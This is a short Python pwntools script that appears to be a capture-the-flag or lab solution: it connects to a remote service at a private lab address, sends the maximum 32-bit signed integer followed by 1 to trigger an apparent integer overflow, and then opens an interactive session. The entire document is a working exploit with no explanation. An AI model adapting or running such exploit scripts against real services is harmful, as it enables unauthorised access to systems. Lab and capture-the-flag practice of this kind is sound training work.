from pwn import *

context(arch="amd64", os="linux", endian="little")

r = remote("10.10.208.100", 9005)

r.clean()

r.sendline(b"2147483647") # 0x7fffffff
r.sendline(b"1")

r.interactive()
